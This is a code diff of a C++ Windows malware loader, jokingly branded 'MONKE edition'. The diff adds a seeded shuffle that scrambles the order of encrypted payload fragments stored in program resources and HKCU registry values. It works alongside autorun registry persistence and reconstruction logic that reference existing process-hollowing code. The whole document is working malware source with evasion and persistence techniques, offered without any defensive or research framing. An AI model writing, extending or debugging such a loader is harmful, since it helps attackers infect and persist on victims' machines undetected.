@@ -3,21 +3,22 @@
 #include <vector>
 #include <wincrypt.h>
 #include <cstdio>
+#include <random>    // ADD THIS LINE
 #include <string>
 #include <algorithm>
 #pragma comment(lib, "advapi32.lib")
 
 #pragma pack(push, 1)
 struct PayloadIndex {
-    uint32_t magic;
+    uint32_t magic = 0xCAFEBABE;
     uint8_t  first_key;
     uint32_t total_size;
     uint16_t chunk_count;
     uint16_t first_chunk_id;
     uint32_t crc32;
+    uint16_t shuffle_seed;  // NEW: Add this line
 };
 #pragma pack(pop)
-
 typedef struct _PROCESS_BASIC_INFORMATION {
     PVOID Reserved1;
     PVOID PebBaseAddress;
@@ -73,10 +74,6 @@ bool VerifyPayload(const std::vector<char>& payload, uint32_t expected_crc, uint
     D("Payload verification OK", "SUCCESS");
     return true;
 }
-
-// ====================================================================
-// REGISTRY PERSISTENCE FUNCTIONS - MONKE EDITION 🐒
-// ====================================================================
 
 bool IsInAutorun() {
     HKEY hKey;
@@ -146,7 +143,6 @@ bool RegistryFragmentsExist() {
     return indexExists;
 }
 
-// MONKE STORE ENCRYPTED FRAGMENTS IN REGISTRY 🍌
 bool StoreFragmentsInRegistry(const PayloadIndex& index, const std::vector<std::vector<BYTE>>& encryptedChunks) {
     HKEY hKey;
     DWORD disposition;
@@ -183,7 +179,6 @@ bool StoreFragmentsInRegistry(const PayloadIndex& index, const std::vector<std::
     return true;
 }
 
-// MONKE LOAD ENCRYPTED FRAGMENTS FROM REGISTRY 🍌
 std::vector<char> LoadFragmentsFromRegistry() {
     HKEY hKey;
     if (RegOpenKeyExW(HKEY_CURRENT_USER,
@@ -207,25 +202,70 @@ std::vector<char> LoadFragmentsFromRegistry() {
         return {};
     }
     
-    // Load encrypted chunks from registry
-    std::vector<std::vector<BYTE>> encryptedChunks;
+    // Load encrypted chunks from registry IN SHUFFLED ORDER
+    std::vector<std::vector<BYTE>> shuffledEncryptedChunks(index.chunk_count);
     for (int i = 0; i < index.chunk_count; ++i) {
         std::wstring chunkName = L"item" + std::to_wstring(i);
         DWORD chunkSize = 0;
         
         if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, NULL, &chunkSize) == ERROR_SUCCESS) {
-            std::vector<BYTE> encryptedChunk(chunkSize);
-            if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, encryptedChunk.data(), &chunkSize) == ERROR_SUCCESS) {
-                encryptedChunks.push_back(std::move(encryptedChunk));
+            shuffledEncryptedChunks[i].resize(chunkSize);
+            if (RegQueryValueExW(hKey, chunkName.c_str(), NULL, NULL, shuffledEncryptedChunks[i].data(), &chunkSize) != ERROR_SUCCESS) {
+                RegCloseKey(hKey);
+                return {};
             }
+        } else {
+            RegCloseKey(hKey);
+            return {};
         }
     }
     
     RegCloseKey(hKey);
     
-    if (encryptedChunks.size() != index.chunk_count) {
+    if (shuffledEncryptedChunks.size() != index.chunk_count) {
         return {};
     }
+    
+    // ============ USE SAME DESHUFFLE LOGIC AS RESOURCES ============
+    // Regenerate shuffle order using stored seed
+    std::vector<int> chunk_order(index.chunk_count);
+    for (int i = 0; i < index.chunk_count; ++i) {
+        chunk_order[i] = i;
+    }
+    
+    std::mt19937 rng(index.shuffle_seed);
+    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
+    
+    // Debug output
+    char shuffle_info[512];
+    sprintf_s(shuffle_info, "Registry deshuffle seed: %u\nOrder (first 5): %d %d %d %d %d", 
+              index.shuffle_seed, 
+              chunk_order[0], 
+              chunk_order.size() > 1 ? chunk_order[1] : -1,
+              chunk_order.size() > 2 ? chunk_order[2] : -1,
+              chunk_order.size() > 3 ? chunk_order[3] : -1,
+              chunk_order.size() > 4 ? chunk_order[4] : -1);
+    D(shuffle_info, "REGISTRY DESHUFFLE");
+    
+    // Reorder shuffled chunks back into logical order
+    std::vector<std::vector<BYTE>> encryptedChunks(index.chunk_count);
+    for (int registry_pos = 0; registry_pos < index.chunk_count; ++registry_pos) {
+        int logical_idx = chunk_order[registry_pos];
+        
+        if (registry_pos < shuffledEncryptedChunks.size()) {
+            encryptedChunks[logical_idx] = std::move(shuffledEncryptedChunks[registry_pos]);
+            
+            char buf[256];
+            sprintf_s(buf, "Registry item %d → Logical chunk %d", 
+                      registry_pos, logical_idx);
+            D(buf, "DESHUFFLING");
+        } else {
+            D("Shuffle mapping out of bounds!", "ERROR");
+            return {};
+        }
+    }
+
+    // ==================== END FIXED SHUFFLE LOGIC ====================
     
     // DECRYPT THE FRAGMENTS MONKE STYLE 🐒
     char buf[512];
@@ -355,37 +395,96 @@ std::vector<char> LoadFragmentsFromRegistry() {
     return payload;
 }
 
-// MONKE GET ENCRYPTED FRAGMENTS FROM RESOURCES 🍌
+// MONKE GET ENCRYPTED FRAGMENTS FROM RESOURCES 🍌 - FIXED VERSION
+// MONKE GET ENCRYPTED FRAGMENTS FROM RESOURCES 🍌 - FIXED VERSION
 std::pair<PayloadIndex, std::vector<std::vector<BYTE>>> LoadEncryptedFragmentsFromResources() {
     DWORD indexSize = 0;
     unsigned char* indexData = LoadResourceByID(999, &indexSize);
     if (!indexData || indexSize < sizeof(PayloadIndex)) {
+        D("Failed to load index", "ERROR");
         return {};
     }
 
     PayloadIndex* idx = (PayloadIndex*)indexData;
     if (idx->magic != 0xCAFEBABE) {
+        D("Invalid magic", "ERROR");
         return {};
     }
 
-    std::vector<std::vector<BYTE>> encryptedChunks;
-    
-    // Load encrypted chunks WITHOUT decrypting
-    for (int i = 0; i < idx->chunk_count; ++i) {
-        int resId = idx->first_chunk_id + i;
+    // Load chunks in RESOURCE ORDER (300, 301, 302...) - This is SHUFFLED order
+    std::vector<std::vector<BYTE>> shuffledEncryptedChunks;
+    for (int resource_position = 0; resource_position < idx->chunk_count; ++resource_position) {
+        int resId = idx->first_chunk_id + resource_position;
+        
         DWORD chunk_size = 0;
         unsigned char* encrypted_data = LoadResourceByID(resId, &chunk_size);
         
         if (encrypted_data && chunk_size > 0) {
             std::vector<BYTE> chunk(encrypted_data, encrypted_data + chunk_size);
-            encryptedChunks.push_back(chunk);
+            shuffledEncryptedChunks.push_back(chunk);
+            
+            char buf[256];
+            sprintf_s(buf, "Loaded resource %d (position %d)", resId, resource_position);
+            D(buf, "LOAD");
+        } else {
+            char buf[256];
+            sprintf_s(buf, "Failed to load resource ID %d", resId);
+            D(buf, "ERROR");
+            return {};
         }
     }
 
-    return {*idx, encryptedChunks};
+    if (shuffledEncryptedChunks.size() != idx->chunk_count) {
+        D("Not all chunks loaded from resources", "ERROR");
+        return {};
+    }
+    
+    // ============ USE SAME LOGIC AS LoadFragmentsFromRegistry() ============
+    // Regenerate the shuffle order using the stored seed
+    std::vector<int> chunk_order(idx->chunk_count);
+    for (int i = 0; i < idx->chunk_count; ++i) {
+        chunk_order[i] = i;
+    }
+    
+    std::mt19937 rng(idx->shuffle_seed);
+    std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
+    
+    // Debug output
+    char shuffle_info[512];
+    sprintf_s(shuffle_info, "Resource shuffle seed: %u\nOrder (first 5): %d %d %d %d %d", 
+              idx->shuffle_seed, 
+              chunk_order[0], 
+              chunk_order.size() > 1 ? chunk_order[1] : -1,
+              chunk_order.size() > 2 ? chunk_order[2] : -1,
+              chunk_order.size() > 3 ? chunk_order[3] : -1,
+              chunk_order.size() > 4 ? chunk_order[4] : -1);
+    D(shuffle_info, "RESOURCE SHUFFLE");
+
+    
+    // Reorder shuffled chunks back into logical order (0, 1, 2...)
+    std::vector<std::vector<BYTE>> encryptedChunks(idx->chunk_count);
+   // Reorder the shuffled chunks into their logical positions using chunk_order
+for (int resource_pos = 0; resource_pos < idx->chunk_count; ++resource_pos) {
+    int logical_idx = chunk_order[resource_pos];
+
+    if (resource_pos < shuffledEncryptedChunks.size()) {
+        encryptedChunks[logical_idx] = std::move(shuffledEncryptedChunks[resource_pos]);
+
+        char buf[256];
+        sprintf_s(buf, "Resource %d → Logical chunk %d", resource_pos, logical_idx);
+        D(buf, "REORDERING");
+    } else {
+        D("Shuffle mapping out of bounds!", "ERROR");
+        return {};
+    }
 }
 
-// MONKE SMART RECONSTRUCTION - REGISTRY FIRST! 🐒
+
+    // ==================== END SAME LOGIC ====================
+    
+    D("All chunks loaded and reordered", "SUCCESS");
+    return {*idx, encryptedChunks};
+}
 std::vector<char> ReconstructFragmentsWithRegistryPersistence() {
     // STEP 1: Ensure monke persists
     if (!IsInAutorun()) {
@@ -403,17 +502,47 @@ std::vector<char> ReconstructFragmentsWithRegistryPersistence() {
         D("Registry load failed, falling back to resources", "REGISTRY FAIL");
     }
     
-    // STEP 3: Load from resources, STORE in registry, then decrypt
+    // STEP 3: Load from resources, STORE SHUFFLED in registry, then decrypt
     D("No fragments in registry, loading from resources...", "RESOURCE MODE");
     
-    // Get encrypted fragments from resources
-    auto [index, encryptedChunks] = LoadEncryptedFragmentsFromResources();
+    // Get encrypted fragments from resources (already in LOGICAL order)
+    auto [index, encryptedChunksLogical] = LoadEncryptedFragmentsFromResources();
     
-    if (!encryptedChunks.empty()) {
-        // STORE ENCRYPTED FRAGMENTS IN REGISTRY FOR NEXT TIME
-        StoreFragmentsInRegistry(index, encryptedChunks);
+    if (!encryptedChunksLogical.empty()) {
+        // ================== CRITICAL FIX ==================
+        // Convert LOGICAL order back to SHUFFLED order for registry storage
+        std::vector<int> chunk_order(index.chunk_count);
+        for (int i = 0; i < index.chunk_count; ++i) {
+            chunk_order[i] = i;
+        }
         
-        // Now decrypt them (using same logic as registry decryption)
+        std::mt19937 rng(index.shuffle_seed);
+        std::shuffle(chunk_order.begin(), chunk_order.end(), rng);
+        
+        // Create inverse mapping: logical_idx → registry_position
+        std::vector<int> inverse_order(index.chunk_count);
+        for (int registry_pos = 0; registry_pos < index.chunk_count; ++registry_pos) {
+            int logical_idx = chunk_order[registry_pos];
+            inverse_order[logical_idx] = registry_pos;
+        }
+        
+        // Reorder logical chunks back to shuffled order
+        std::vector<std::vector<BYTE>> encryptedChunksShuffled(index.chunk_count);
+        for (int logical_idx = 0; logical_idx < index.chunk_count; ++logical_idx) {
+            int registry_pos = inverse_order[logical_idx];
+            encryptedChunksShuffled[registry_pos] = encryptedChunksLogical[logical_idx];
+            
+            char buf[256];
+            sprintf_s(buf, "Storing: Logical %d → Registry item %d", 
+                      logical_idx, registry_pos);
+            D(buf, "REGISTRY SHUFFLE");
+        }
+        
+        // STORE SHUFFLED FRAGMENTS IN REGISTRY
+        StoreFragmentsInRegistry(index, encryptedChunksShuffled);
+        // ================== END FIX ==================
+        
+        // Now decrypt the LOGICAL order chunks
         char buf[512];
         std::vector<char> payload;
         payload.reserve(index.total_size + 1024);
@@ -429,11 +558,11 @@ std::vector<char> ReconstructFragmentsWithRegistryPersistence() {
         BYTE last_cipher_block[16] = {0};
 
         for (int i = 0; i < index.chunk_count; ++i) {
-            const auto& encrypted_data = encryptedChunks[i];
+            const auto& encrypted_data = encryptedChunksLogical[i]; // Use LOGICAL order for decryption
             DWORD chunk_size = (DWORD)encrypted_data.size();
 
-            sprintf_s(buf, "Resource Chunk %d: Size: %u bytes", i, chunk_size);
-            D(buf, "LOADING");
+            sprintf_s(buf, "Decrypting logical chunk %d: %u bytes", i, chunk_size);
+            D(buf, "DECRYPTING");
 
             // Your existing decryption logic...
             BYTE iv[16] = {0};
@@ -510,7 +639,6 @@ std::vector<char> ReconstructFragmentsWithRegistryPersistence() {
     
     return {};
 }
-
 // ====================================================================
 // EXISTING HOLLOWING CODE - UNCHANGED
 // ====================================================================
